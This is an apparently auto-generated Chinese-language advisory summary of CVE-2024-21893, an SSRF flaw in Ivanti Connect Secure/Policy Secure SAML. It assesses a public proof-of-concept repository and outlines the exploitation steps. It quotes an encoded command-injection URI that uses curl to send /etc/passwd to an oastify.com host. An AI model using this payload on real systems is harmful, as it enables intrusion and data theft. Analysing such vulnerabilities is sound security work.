## CVE-2024-21893-Ivanti Connect Secure/Policy Secure-SSRF

**漏洞编号:** CVE-2024-21893

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Ivanti Connect Secure/Policy Secure

**危害等级:** 高危，允许未经身份验证的攻击者访问受限资源，可能导致敏感信息泄露和远程代码执行

**影响版本:** Ivanti Connect Secure (9.x, 22.x), Ivanti Policy Secure (9.x, 22.x)

**利用条件:** 需要网络访问到存在漏洞的Ivanti Connect Secure或Policy Secure设备的SAML接口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21893 是 Ivanti Connect Secure 和 Policy Secure 产品中 SAML 组件的一个服务器端请求伪造 (SSRF) 漏洞。未经身份验证的攻击者可以利用此漏洞访问受限资源。 

**有效性分析：**
提供的 POC 代码利用了 SAML 接口的 SSRF 漏洞。它构造一个包含恶意 `RetrievalMethod URI` 的 SOAP 请求，该 URI 指向攻击者控制的服务器，从而使服务器能够执行任意 HTTP 请求。根据搜索结果，该漏洞已被积极利用，并且存在公开可用的漏洞利用代码，表明该 POC 代码很可能有效。

**投毒风险分析：**
检查提供的`CVE-2024-21893.py`脚本，没有发现明显的恶意或隐藏的后门代码。 该脚本旨在发送特制的 SOAP 请求以触发 SSRF 漏洞。虽然攻击者可以使用此漏洞执行各种恶意操作，但这不属于投毒的范畴。投毒是指在代码中故意插入恶意代码，而此脚本仅利用了现有漏洞。`README.md`文件中的示例也清晰地展示了如何利用该漏洞，没有隐藏任何恶意步骤。因此，投毒风险评估为 0%。

**利用方式：**
1.  **漏洞定位：** 该漏洞存在于 Ivanti Connect Secure 和 Policy Secure 产品的 SAML 组件中，具体路径通常是 `/dana-ws/saml20.ws`。
2.  **构造恶意 SOAP 请求：** 攻击者构造一个包含恶意 `RetrievalMethod URI` 的 SOAP 请求。`RetrievalMethod URI` 指向攻击者控制的服务器。
3.  **发送请求：** 攻击者将构造的 SOAP 请求发送到目标 Ivanti 设备的 SAML 接口 (`/dana-ws/saml20.ws`)。
4.  **触发 SSRF：**  当 Ivanti 设备处理该请求时，它会尝试从 `RetrievalMethod URI` 指定的地址检索资源，从而触发 SSRF 漏洞。
5.  **利用 SSRF：** 攻击者可以使用 SSRF 漏洞访问内部资源，例如内部服务器、数据库或其他敏感信息。此外，根据`README.md`中的描述，还可以通过构造包含命令注入的URI，例如`http://127.0.0.1:8090/api/v1/license/keys-status/%3bcurl%20-X%20POST%20-d%20%40%2fetc%2fpasswd%20http%3a%2f%2f8oxxxxxxxxxxxxx.oastify.com%3b`，实现远程代码执行。

总而言之，此漏洞利用的有效性较高，但提供的代码本身没有投毒风险，利用方式是构造包含恶意URI的SOAP请求触发SSRF，并最终可能导致RCE。

**项目地址:** [h4x0r-dz/CVE-2024-21893.py](https://github.com/h4x0r-dz/CVE-2024-21893.py)

**漏洞详情:** [CVE-2024-21893](https://nvd.nist.gov/vuln/detail/CVE-2024-21893)